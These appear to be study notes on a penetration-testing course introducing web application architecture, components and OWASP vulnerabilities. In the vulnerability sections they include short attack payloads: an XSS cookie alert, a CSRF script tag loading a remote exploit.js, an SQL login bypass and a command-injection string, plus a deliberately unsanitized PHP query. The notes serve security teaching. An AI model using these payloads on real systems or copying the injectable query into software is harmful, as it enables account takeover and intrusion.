
**Table of Contents:** 

- **Introduction to Web Applications**
    - Web Application Layout
    - Front-end vs Back-end
- **Front End Components**
    - HTML
    - CSS
    - JS
- **Front End Vulnerabilities**
    - Sensitive Data Exposure
    - HTML Injection
    - Cross-Site Scripting (XSS)
    - Cross-Site Request Forgery (CSRF)
- **Back End Components**
    - Back End Servers
    - Web Servers
    - Databases
    - Development Frameworks & APIs
- **Back End Vulnerabilities**
    - Common Web Vulnerabilities
    - Public Vulnerabilities

# **Introduction to Web Applications**

## **Web Application Layout**

Web applications vary widely in design, purpose, and infrastructure. To understand how they work behind the scenes, we look at **three main areas**:

| **Category** | **Description** |
| --- | --- |
| `Web Application Infrastructure` | Describes the structure of required components, such as the database, needed for the web application to function as intended. Since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access. |
| `Web Application Components` | The components that make up a web application represent all the components that the web application interacts with. These are divided into the following three areas: `UI/UX`, `Client`, and `Server` components. |
| `Web Application Architecture` | Architecture comprises all the relationships between the various web application components. |

### **1. Web Application Infrastructure**

This defines **how the app’s components are hosted** and how they interact. Common infrastructure models:

**a) Client–Server**

- Standard model: browser (client) sends requests → server processes → returns responses.

**b) One Server**

- All components (app + database) on one machine.
- Simple but risky — one breach or outage affects everything.

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/1.png)

Difference between Client-Server Model and One-Server Model

| Feature | Client–Server Model | One-Server Model |
| --- | --- | --- |
| **What it describes?** | How clients and server communicate | How the web app is hosted |
| **Number of servers?** | Not specified (could be 1 or many) | Exactly **one** |
| **Includes database?** | Not about hosting | Database is on the same server |
| **Common usage?** | Almost all web apps | Small/simple apps |
| **Main limitation?** | Doesn’t define infra security | High risk—if one server fails, everything dies |

Example Usage:

**Client–Server:**

- Your web browser (client) visits amazon.com
- Amazon’s servers process the requests
- Could be hundreds of servers behind the scenes
    
    ➡️ The model just describes the communication.
    

**One-Server:**

- A small company hosts its website AND its database AND its APIs on **one machine**
    
    ➡️ If that machine is hacked or crashes, everything is down.
    

**c) Many Servers – One Database**

- Web apps run on multiple servers but share **one database server**.
- Better segmentation and security.

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/2.png)

**d) Many Servers – Many Databases**

- Each app has its own database or separate sections within a database server.
- High redundancy, secure, often uses load balancers.

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/3.png)

---

### **2. Web Application Components**

Most apps include:

- **Client:** browser/UI (HTML, CSS, JS)
- **Server:** handles logic and requests
- **Webserver:** e.g., Nginx, IIS, Apache
- **Database:** stores structured data
- **Microservices:** small independent services (search, payments, reviews)
- **3rd-party integrations**
- **Serverless functions:** cloud-run tasks

---

### **3. Web Application Architecture (Three-Tier Model)**

**a) Presentation Layer**

- UI delivered to the user (HTML, JS, CSS)

**b) Application Layer**

- Processes requests, handles logic, permissions, and decisions

**c) Data Layer**

- Handles access to databases and data storage

An example of a web application architecture could look something like this:

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/4.png)

!ASP.NET Core architecture diagram showing client, IIS reverse proxy, ASP.NET Core web app with filters and services, connected to data sources, identity providers, and third-party services.

Source:

[Microsoft Doc](https://docs.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/common-web-application-architectures)

Furthermore, some web servers can run operating system calls and programs, like IIS ISAPI) or PHP-CGI.

### **Microservices**

- Small, independent services focusing on one function.
- Communicate statelessly.
- Benefits: scalable, agile, resilient, reusable, supports many languages.

> Google Could:  A microservices architecture is a type of application architecture where the application is developed as a collection of services. It provides the framework to develop, deploy, and maintain microservices architecture diagrams and services independently.
> 

---

### **Serverless Architecture**

- Provided by cloud platforms (AWS, Azure, GCP)
- No server management required
- Code runs in containers on demand
- Good for scalability and quick deployment

---

### **Architecture Security**

Security must be considered at all stages.

Key risks:

- **Design flaws**, not just coding bugs
- Weak access control (e.g., improper RBAC)
- Segmentation issues (e.g., DB and app on same server)
- Difficulty locating DB due to distributed setups

Pen testing must evaluate **both application code and architecture design**.

---

## Front-end vs Back-end

Web applications consist of two major sides:

### **1. Front End (Client-Side)**

The front end is everything the **user sees and interacts with** in their browser.

**Key Technologies**

- **HTML** – structure/content
- **CSS** – design/style
- **JavaScript** – interactivity/functionality

**Characteristics**

- Runs in the browser
- Must work on all devices, screen sizes, and browsers
- Poorly optimized front end = slow, unresponsive site (even if backend is fast)

**Related Tasks**

- UI design
- UX design
- Visual web design
- Building responsive layouts

### **2. Back End (Server-Side)**

The back end handles the **logic, data, and operations** of the web application.

**Main Components**

1. **Back end servers**
    - Hardware + OS (Linux, Windows, containers)
2. **Web servers**
    - Handle HTTP requests
    - Examples: Apache, NGINX, IIS
3. **Databases**
    - Store and retrieve data
    - SQL (MySQL, MSSQL, Oracle)
    - NoSQL (MongoDB, etc.)
4. **Development frameworks**
    - Build the application logic
    - Examples: `Laravel` (`PHP`), `ASP.NET` (`C#`), `Spring` (`Java`), `Django` (`Python`), and `Express` (`NodeJS JavaScript`).

**Back End Responsibilities**

- Process user requests
- Run business logic and application logic
- Manage databases
- Handle APIs for communication with the front end
- Integrate external services
- Maintain security and access control

**Infrastructure**

- Components can be separated using:
    - Containers (Docker)
    - Individual servers
    - This improves isolation and security

### **3. Security: Front End & Back End**

**Front End**

- Can be reviewed directly (HTML/JS is visible)
- Vulnerabilities found through **whitebox testing**

**Back End**

- Source code is hidden on the server
- Usually tested through **blackbox testing**
- However, vulnerabilities like LFI can expose backend code

**Common Back End Attack Examples**

- **SQL Injection** – manipulate database queries
- **Command Injection** – execute OS commands

The `top 20` most common mistakes web developers make that are essential for us as penetration testers are:

| **No.** | **Mistake** |
| --- | --- |
| `1.` | Permitting Invalid Data to Enter the Database |
| `2.` | Focusing on the System as a Whole |
| `3.` | Establishing Personally Developed Security Methods |
| `4.` | Treating Security to be Your Last Step |
| `5.` | Developing Plain Text Password Storage |
| `6.` | Creating Weak Passwords |
| `7.` | Storing Unencrypted Data in the Database |
| `8.` | Depending Excessively on the Client Side |
| `9.` | Being Too Optimistic |
| `10.` | Permitting Variables via the URL Path Name |
| `11.` | Trusting third-party code |
| `12.` | Hard-coding backdoor accounts |
| `13.` | Unverified SQL injections |
| `14.` | Remote file inclusions |
| `15.` | Insecure data handling |
| `16.` | Failing to encrypt data properly |
| `17.` | Not using a secure cryptographic system |
| `18.` | Ignoring layer 8 |
| `19.` | Review user actions |
| `20.` | Web Application Firewall misconfigurations |

These mistakes lead to the OWASP Top 10 vulnerabilities for web applications, which we will discuss in other modules:

| **No.** | **Vulnerability** |
| --- | --- |
| `1.` | Broken Access Control |
| `2.` | Cryptographic Failures |
| `3.` | Injection |
| `4.` | Insecure Design |
| `5.` | Security Misconfiguration |
| `6.` | Vulnerable and Outdated Components |
| `7.` | Identification and Authentication Failures |
| `8.` | Software and Data Integrity Failures |
| `9.` | Security Logging and Monitoring Failures |
| `10.` | Server-Side Request Forgery (SSRF) |

It is important to begin to familiarize ourselves with these flaws and vulnerabilities as they form the basis for many of the issues we cover in future web and even non-web related modules. As pentesters, we must have the ability to competently identify, exploit, and explain these vulnerabilities for our clients.

# **Front End Components**

## **HTML**

---

The first and most dominant component of the front end of web applications is HTML (HyperText Markup Language). HTML is at the very core of any web page we see on the internet. It contains each page's basic elements, including titles, forms, images, and many other elements. The web browser, in turn, interprets these elements and displays them to the end-user.

The following is a very basic example of an HTML page:

### **Example**



```html
<!DOCTYPE html>
<html><head><title>Page Title</title></head><body><h1>A Heading</h1><p>A Paragraph</p></body></html>
```

This would display the following:

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/5.jpeg)

As we can see, HTML elements are displayed in a tree form, similar to `XML` and other languages:

### **HTML Structure**

HTML

```html
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```

### **HTML Elements**

- Every HTML element has **opening and closing tags** (e.g., `<p> ... </p>`).
- Content goes **between the tags**.
- Tags can include **attributes** like `id` and `class`, which help CSS and JavaScript target elements:
    - `<p id="para1">`
    - `<p class="red-paragraphs">`

### **2. URL Encoding (Percent-Encoding)**

- URLs can only use **ASCII characters**, so unsafe characters must be encoded.
- Encoding uses:
    
    **%** + **two hex digits**
    
    Example:
    
    - `'` becomes `%27`
    - space becomes `%20` or `+`

| **Character** | **Encoding** |
| --- | --- |
| space | %20 |
| ! | %21 |
| " | %22 |
| # | %23 |
| $ | %24 |
| % | %25 |
| & | %26 |
| ' | %27 |
| ( | %28 |
| ) | %29 |

A full character encoding table can be seen [here](https://www.w3schools.com/tags/ref_urlencode.ASP).

### **3. HTML Usage and Structure**

Key page elements:

- `<head>` → metadata, title, scripts, styles
- `<body>` → main visible content
- `<style>` → CSS
- `<script>` → JavaScript

### **4. DOM (Document Object Model)**

The DOM is a **structured representation** of an HTML page used by browsers and scripts.

W3C defines DOM as a **language-neutral interface** allowing scripts to access & update:

- Content
- Structure
- Style

**DOM Types**

- **Core DOM** – general model for all documents
- **XML DOM** – for XML
- **HTML DOM** – for HTML

You can reference DOM objects like:

- `document.head`
- `document.body`
- `document.h1`

---

### **5. Why DOM Matters**

- Helps locate elements by **id**, **tag**, or **class**.
- Essential for analyzing the structure of webpages.
- Useful in security testing (e.g., XSS), where attackers:
    - Modify existing elements
    - Inject new elements

## **Cascading Style Sheets (CSS)**

CSS (Cascading Style Sheets) is the stylesheet language used alongside HTML to format and set the style of HTML elements. Like HTML, there are several versions of CSS, and each subsequent version introduces a new set of capabilities that can be used for formatting HTML elements. Browsers are updated alongside it to support these new features.

### **Example**

At a fundamental level, CSS is used to define the style of each class or type of HTML elements (i.e., `body` or `h1`), such that any element within that page would be represented as defined in the CSS file. This could include the font family, font size, background color, text color and alignment, and more.

Code: css

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}

```

As previously mentioned, this is why we may set unique IDs or class names for certain HTML elements so that we can later refer to them within CSS or JavaScript when needed.

### **Syntax**

CSS defines the style of each HTML element or class between curly brackets `{}`, within which the properties are defined with their values (i.e. `element { property : value; }`).

Each HTML element has many properties that can be set through CSS, such as `height`, `position`, `border`, `margin`, `padding`, `color`, `text-align`, `font-size`, and hundreds of other properties. All of these can be combined and used to design visually appealing web pages.

## JavaScript

### **1. What JavaScript Is**

- One of the most widely used programming languages.
- Primarily a **front-end** language executed in the browser.
- Can also be used on the **back end** via **NodeJS**.
- Controls **interactivity** and **functionality** of web pages (while HTML = structure, CSS = style).

### **2. How JavaScript Is Loaded**

**Inline / Embedded Code**

```html
<script>
   // JavaScript code
</script>
```

**External File**

```html
<script src="script.js"></script>
```

### **3. Example**

```jsx
document.getElementById("button1").innerHTML = "Changed Text!";
```

- This changes the content of an HTML element with ID `button1`.
- Often used in event handlers like button clicks.

### **4. JavaScript Usage**

JavaScript enables:

- Real-time updates to the webpage
- Dynamic content and animations
- Handling user input
- Making HTTP requests (e.g., using **Ajax**)
- Automating tasks in the browser
- Creating interactive UI components

Browsers have built-in **JavaScript engines**, allowing fast client-side execution without server communication.

### **5. JavaScript Frameworks**

Frameworks simplify development and add advanced functionality.

Common front-end frameworks:

- [Angular](https://www.w3schools.com/angular/angular_intro.asp)
- [React](https://www.w3schools.com/react/react_intro.asp)
- [Vue](https://www.w3schools.com/whatis/whatis_vue.asp)
- [jQuery](https://www.w3schools.com/jquery/)

They help build large, dynamic applications by providing tools, reusable components, and better code structure.

# **Front End Vulnerabilities**

## **Sensitive Data Exposure**

https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure

## **HTML Injection**

> HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can have many consequences, like disclosure of a user’s session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims.
> 

**Example:** 

The following example is a very basic web page with a single button "`Click to enter your name`." When we click on the button, it prompts us to input our name and then displays our name as "`Your name is ...`":

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/6.png)

If no input sanitization is in place, this is potentially an easy target for `HTML Injection` and `Cross-Site Scripting (XSS)` attacks.

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/7.png)

once you click on Click Me you will be redirected to hackthebox web page

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/8.png)

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/9.jpeg)

Or inserting this html code into the prompt

```bash
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/10.jpeg)

## **Cross-Site Scripting (XSS)**

---

`HTML Injection` vulnerabilities can often be utilized to also perform Cross-Site Scripting (XSS) attacks by injecting `JavaScript` code to be executed on the client-side. Once we can execute code on the victim's machine, we can potentially gain access to the victim's account or even their machine. `XSS` is very similar to `HTML Injection` in practice. However, `XSS` involves the injection of `JavaScript` code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of `XSS`:

| **Type** | **Description** |
| --- | --- |
| `Reflected XSS` | Occurs when user input is displayed on the page after processing (e.g., search result or error message). |
| `Stored XSS` | Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments). |
| `DOM XSS` | Occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g., vulnerable username or page title). |

In the example we saw for `HTML Injection`, there was no input sanitization whatsoever. Therefore, it may be possible for the same page to be vulnerable to `XSS` attacks. We can try to inject the following `DOM XSS` `JavaScript` code as a payload, which should show us the cookie value for the current user:



```jsx
#"><img src=/ onerror=alert(document.cookie)>

```

Once we input our payload and hit `ok`, we see that an alert window pops up with the cookie value in it:

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/11.png)

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/12.png)

This payload is accessing the `HTML` document tree and retrieving the `cookie` object's value. When the browser processes our input, it will be considered a new `DOM`, and our `JavaScript` will be executed, displaying the cookie value back to us in a popup.

An attacker can leverage this to steal cookie sessions and send them to themselves and attempt to use the cookie value to authenticate to the victim's account. The same attack can be used to perform various types of other attacks against a web application's users

## **Cross-Site Request Forgery (CSRF)**

The third type of front end vulnerability that is caused by unfiltered user input is [Cross-Site Request Forgery](https://owasp.org/www-community/attacks/csrf). `CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

A common `CSRF` attack to gain higher privileged access to a web application is to craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the `JavaScript` `CSRF` payload), the `JavaScript` code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

`CSRF` can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using `JavaScript` code that would return the session cookie, we would load a remote `.js` (`JavaScript`) file, as follows:

Code: html

```html
"><script src=//www.example.com/exploit.js></script>
```

The `exploit.js` file would contain the malicious `JavaScript` code that changes the user's password. Developing the `exploit.js` in this case requires knowledge of this web application's password changing procedure and `APIs`. The attacker would need to create `JavaScript` code that would replicate the desired functionality and automatically carry it out (i.e., `JavaScript` code that changes our password for this specific web application).

### **Prevention**

Two main controls must be applied when accepting user input:

| **Type** | **Description** |
| --- | --- |
| `Sanitization` | Removing special characters and non-standard characters from user input before displaying it or storing it. |
| `Validation` | Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format) |

for more details → [Cross-Site Request Forgery Prevention Cheat Sheet ](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

# **Back End Components**

## **Back End Servers**

A back-end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application

### **Software**

The back end server contains the other 3 back end components:

- `Web Server`
- `Database`
- `Development Framework`

![Alt](/HTB/Web_Penetration_Tester/Introduction_to_web_application/images/13.jpeg)

Other software components on the back end server may include hypervisors, containers, and WAFs.

There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components. Some common examples include:

| **Combinations** | **Components** |
| --- | --- |
| [LAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)) | `Linux`, `Apache`, `MySQL`, and `PHP`. |
| [WAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)#WAMP)) | `Windows`, `Apache`, `MySQL`, and `PHP`. |
| [WINS](https://en.wikipedia.org/wiki/Solution_stack) | `Windows`, `IIS`, `.NET`, and `SQL Server` |
| [MAMP](https://en.wikipedia.org/wiki/MAMP) | `macOS`, `Apache`, `MySQL`, and `PHP`. |
| [XAMPP](https://en.wikipedia.org/wiki/XAMPP) | Cross-Platform, `Apache`, `MySQL`, and `PHP/PERL`. |

We can find a comprehensive list of Web Solution Stacks in this [article](https://en.wikipedia.org/wiki/Solution_stack).

### **Hardware**

The back end server contains all of the necessary hardware. The power and performance capabilities of this hardware determine how stable and responsive the web application will be

## Web Servers

A **web server** is a backend application that receives HTTP requests from clients (browsers) and returns the appropriate HTTP responses. It typically runs on **TCP ports 80 (HTTP)** and **443 (HTTPS)**. Web servers handle routing, processing user input (text, JSON, files), and returning web pages or data.

### **Workflow**

1. Client sends an HTTP request.
2. Server processes it, runs necessary backend logic.
3. Server returns a response with an HTTP status code.

Common HTTP status codes include:

- **200 OK** – Successful request
- **301 / 302** – Permanent / Temporary redirection
- **400 Bad Request** – Invalid syntax
- **401 Unauthorized** – Login required
- **403 Forbidden** – Access denied
- **404 Not Found** – Page missing
- **500 / 502 / 504** – Server-side errors

Full list → https://developer.mozilla.org/en-US/docs/Web/HTTP/Status

---

### **Common Web Servers**

**1. Apache**

- Hosts **40%+** of internet websites.
- Preinstalled on many Linux systems.
- Works commonly with **PHP**, but supports Python, Perl, .NET, Bash (CGI).
- Open-source and highly modular (e.g., **mod_php**).
- Used by: **Apple, Adobe, Baidu**.

**2. NGINX**

- Hosts **~30%** of websites.
- Designed for **high concurrency** using asynchronous architecture.
- Very efficient and widely used by top high-traffic sites.
- Used by: **Google, Facebook, Twitter, Cisco, Intel, Netflix, HackTheBox**.

**3. IIS (Internet Information Services)**

- Hosts **~15%** of websites.
- Built by Microsoft for **Windows Server**.
- Optimized for **.NET applications** and **Active Directory** integration (Windows Auth).
- Used by: **Microsoft, Office365, Skype, Stack Overflow, Dell**.

---

### **Other Web Servers**

- **Apache Tomcat** – For Java applications.
- **Node.js** – JavaScript backend runtime for web apps.

---

## **Databases**

**Databases in Web Applications**

Web applications use **databases** to store and retrieve data such as user accounts, posts, images, and application content. Databases allow fast, organized, and scalable data access.

Developers choose databases based on:

- **Speed**
- **Storage efficiency**
- **Scalability**
- **Cost**

---

### **1. Relational Databases (SQL)**

Store data in **tables, rows, and columns**.

Tables use **keys** to link information across multiple tables (relationships).

The overall structure is called a **schema**.

Example:

- `users` table (id, username, first/last name)
- `posts` table (id, user_id, content)
- `user_id` links each post to a user.

Strengths:

- Fast queries
- Highly structured
- Excellent for large, well-organized datasets

Common SQL databases:

- **MySQL** (most widely used, free, open-source)
- **MSSQL** (Microsoft server environments)
- **Oracle** (enterprise-grade, very reliable, expensive)
- **PostgreSQL** (open-source, extensible)

Others: SQLite, MariaDB, Amazon Aurora, Azure SQL.

---

### **2. Non-Relational Databases (NoSQL)**

Do **not** use tables, schemas, or strict relationships.

Designed for **flexibility**, **scalability**, and handling irregular/unstructured data.

Four main models:

1. **Key-Value** (simple key: data pairs; often JSON or XML)
2. **Document-Based** (complex JSON documents)
3. **Wide-Column**
4. **Graph**

Example Key-Value JSON:

```json
{
  "100001": {"date": "01-01-2021", "content": "Welcome..."},
  "100002": {"date": "02-01-2021", "content": "First post..."}
}
```

Common NoSQL databases:

- **MongoDB** (document-based, most popular)
- **ElasticSearch** (search and analytics)
- **Apache Cassandra** (highly scalable, fault-tolerant)

Others: Redis, Neo4j, CouchDB, DynamoDB.

---

### **3. Using Databases in Web Applications**

Steps in a typical backend:

1. Install and start the database server.
2. Connect to it from the backend language (PHP, Python, Node, etc.).
3. Create databases and tables.
4. Perform queries (insert, update, select, delete).
5. Return results to the user.

Example (PHP + MySQL):

```php
# connect to the database server and use the user:pass credentials then access to the
# database called database1 
$conn = new mysqli("localhost", "user", "pass", "database1");

# get the value in the findUser parameter
$searchInput =  $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
```

User input (e.g., search fields) is used in SQL queries — if not properly secured, this can cause **SQL Injection** vulnerabilities.

## **Development Frameworks & APIs**

### **1. Development Frameworks**

Modern web applications are complex, so developers use **frameworks** to speed up development and avoid building everything from scratch.

Frameworks include built-in features like:

- User registration
- Authentication
- Routing
- Templating
- Database integration

Common examples:

- **Laravel (PHP):** Easy to use, popular with startups.
- **Express (Node.js):** Used by PayPal, Uber, IBM.
- **Django (Python):** Used by Google, YouTube, Instagram.
- **Rails (Ruby):** Used by GitHub, Twitch, Airbnb.

Large companies often use **multiple frameworks** for different parts of a system.

---

### **2. APIs (Application Programming Interfaces)**

APIs allow the **front end** and **back end** of a web application to communicate.

A front end sends a request → backend processes it → backend responds with data (often JSON).

APIs support features like:

- Login
- Search
- Fetching posts
- Uploading files
- Accessing user data

---

### **3. Query Parameters**

Used to pass data to pages via **GET** and **POST** requests.

Examples:

- GET: `/search.php?item=apples`
- POST:
    
    ```
    POST /search.php
    item=apples
    ```
    

They allow a single page to handle many kinds of input.

---

### **4. Types of Web APIs**

### **SOAP**

- Uses **XML** for requests and responses.
- Good for complex, structured, and stateful data.
- Powerful but often **complicated**.

Example SOAP XML:

```xml
<soap:Envelope>
  <soap:Body>
    <soap:Fault></soap:Fault>
  </soap:Body>
</soap:Envelope>
```

### REST API

A REST API (Representational State Transfer Application Programming Interface) is an architectural style for designing networked applications, particularly web services. It utilizes standard web protocols, primarily HTTP, to enable communication between different systems.

**Key principles and characteristics of REST APIs:**

- **Resources:** REST APIs are built around the concept of resources, which are any data or functionality accessible through the API (e.g., users, products, documents). Each resource is identified by a unique Uniform Resource Identifier (URI).
- **Statelessness:** Each request from a client to the server must contain all the information necessary to understand the request. The server does not store any client context between requests, making the API more scalable and reliable.
- **Client-Server Architecture:** There's a clear separation between the client (the application consuming the API) and the server (the application providing the API).
- **Uniform Interface:** REST APIs aim for a uniform and consistent way of interacting with resources, typically using standard HTTP methods for operations:
    - **GET:** Retrieve a resource or a collection of resources.
    - **POST:** Create a new resource.
    - **PUT:** Update or replace an existing resource entirely.
    - **PATCH:** Partially update an existing resource.
    - **DELETE:** Remove a resource.
- **Layered System:** A client typically cannot tell whether it is connected directly to the end server or to an intermediary server, such as a load balancer or proxy.
- **Cacheability:** Responses from the server can be designated as cacheable or non-cacheable, improving performance by allowing clients to store and reuse frequently accessed data.

**How REST APIs work:**

A client sends an HTTP request to a specific URI representing a resource, using one of the standard HTTP methods. The server processes the request, performs the requested operation on the resource, and returns an HTTP response containing a status code (indicating success or failure) and, often, the requested data in a format like JSON or XML.

**Benefits of using REST APIs:**

- **Simplicity and Ease of Use:** Leverages standard web technologies and principles, making them relatively easy to understand and implement.
- **Scalability:** Statelessness and client-server separation contribute to better scalability.
- **Flexibility:** Supports various data formats and can be consumed by diverse client applications (web, mobile, desktop).
- **Interoperability:** Enables different systems and technologies to communicate effectively.
- https://stackoverflow.com/questions/4024271/rest-api-best-practices-where-to-put-parameters
- [**How API Parameters Work: Query, Path, Header, and Body**](https://treblle.com/blog/api-parameters-query-path-header-body)

# **Back End Vulnerabilities**

## **Common Web Vulnerabilities**

Web applications often contain vulnerabilities due to developer mistakes, insecure coding, or misconfigurations. The following are common issues from the **OWASP Top 10**:

### **1. Broken Authentication & Broken Access Control**

**Broken Authentication:** When login mechanisms are flawed, attackers can:

- Bypass login without credentials
- Elevate privileges (e.g., become admin)

**Example:**

[*College Management System 1.2* ](https://www.exploit-db.com/exploits/47388)allows logging in with an SQL payload:

```
' or 0=0 #
```

### **Broken Access Control**

When users can access resources they shouldn't:

- Normal user accessing admin pages
- Unauthorized access to restricted features

### **2. Malicious File Upload**

If a website doesn't properly validate uploaded files, attackers can upload:

- Web shells (PHP, ASPX, etc.)
- Scripts that give remote command execution

Attackers bypass weak validation using tricks like:

- Double extensions (`shell.php.jpg`)
- Manipulating MIME types

**Example:**

[*WordPress Responsive Thumbnail Slider 1.0*](https://www.rapid7.com/db/modules/exploit/multi/http/wp_responsive_thumbnail_slider_upload/) allows arbitrary file uploads using double extensions.

---

### **3. Command Injection**

Occurs when user input is used inside **OS commands** without proper sanitization.

This allows attackers to append their own commands and execute them on the server.

Example payload:

```
127.0.0.1 | whoami
```

**Example:**

*Plainview Activity Monitor* plugin allows injecting OS commands via the `ip` parameter.

---

## **4. SQL Injection (SQLi)**

Happens when user input is inserted into SQL queries without sanitization.

Example vulnerable code:

```php
$query = "select * from users where name like '%$searchInput%'";

```

Attackers can:

- Bypass login
- Dump the entire database
- Modify or delete data
- Possibly gain server control

**Example:**

*College Management System 1.2* allows injecting SQL that always returns true → authentication bypass.

## **Public Vulnerabilities**

These are backend vulnerabilities that can be exploited **externally** without local server access. They result from coding mistakes in backend components and range from simple bugs to complex security flaws.

### **Public CVEs**

Web applications (open-source or proprietary) are constantly tested worldwide. When vulnerabilities are found, they are patched and assigned a **CVE ID**.

Penetration testers often publish **PoC exploits**, so the **first step** when assessing a system is:

### **1. Identify the application version**

- Check source code pages (e.g., `version.php`).
- Compare with the target's version.

### **2. Search for public exploits**

Use:

- Exploit-DB
- Rapid7 DB
- Vulnerability Lab
- Google search (e.g., “WordPress 5.0 exploit”)

Focus on:

- **High-severity (CVSS 8–10)**
- **Remote Code Execution (RCE)** exploits

Also check vulnerabilities for **plugins and external components** used by the application.

---

### **Common Vulnerability Scoring System (CVSS)**

[CVSS](https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System)  is the global standard for rating vulnerability severity.

### **CVSS Metrics**

- **Base** → inherent severity (0–10)
- **Temporal** → changes over time
- **Environmental** → impact on a specific organization

The **NVD** provides Base scores and calculators for CVSS v2 and v3.

### **Severity Ratings**

**CVSS v2**

- Low: 0–3.9
- Medium: 4–6.9
- High: 7–10

**CVSS v3**

- None: 0
- Low: 0.1–3.9
- Medium: 4–6.9
- High: 7–8.9
- Critical: 9–10

Try using the CVSS calculator to see how scores change when Temporal or Environmental factors are added.  The NVD provides a [CVSS v2 calculator ](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator)and a [CVSS v3 calculator ](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)

---

## **Back-End Server Vulnerabilities**

Aside from application-level bugs, backend components like web servers also have critical vulnerabilities.

Examples:

- **Shellshock (2014)** → exploited Apache servers via HTTP to gain RCE.

Database and backend OS vulnerabilities are often exploited **after gaining internal or low-privilege access**, helping attackers escalate privileges or move laterally.

Even if they are not exploitable externally, they still must be patched to prevent full system compromise.
